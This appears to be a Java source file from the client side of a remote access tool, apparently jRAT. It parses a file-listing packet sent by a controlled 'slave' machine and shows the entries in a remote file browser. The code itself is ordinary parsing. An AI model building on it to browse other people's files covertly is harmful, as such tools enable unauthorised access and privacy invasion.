package se.jrat.client.packets.incoming;

import java.io.DataInputStream;
import java.util.ArrayList;
import java.util.List;

import se.jrat.client.Slave;
import se.jrat.client.io.FileObject;
import se.jrat.client.ui.frames.FrameRemoteFiles;
import se.jrat.client.utils.IconUtils;


public class Packet22ListFiles extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteFiles fr = FrameRemoteFiles.INSTANCES.get(slave);
		List<FileObject> files = new ArrayList<FileObject>();
		List<FileObject> dirs = new ArrayList<FileObject>();

		int len = dis.readInt();

		for (int i = 0; i < len; i++) {
			String path = slave.readLine();
			FileObject fo = new FileObject(path);

			boolean dir = dis.readBoolean();
			boolean hidden = dis.readBoolean();
			
			fo.setHidden(hidden);
			fo.setIcon(IconUtils.getFileIconFromExtension(path, dir));
			
			if (dir) {
				dirs.add(fo);
			} else {
				long date = slave.readLong();
				long size = slave.readLong();

				fo.setDate(date);
				fo.setSize(size);	
				
				files.add(fo);
			}
		}

		if (fr != null) {
			fr.remoteTable.clear();

			for (FileObject fo : dirs) {
				fr.remoteTable.addFileObject(fo);
			}
			
			for (FileObject fo : files) {
				fr.remoteTable.addFileObject(fo);
			}
		}

	}

}
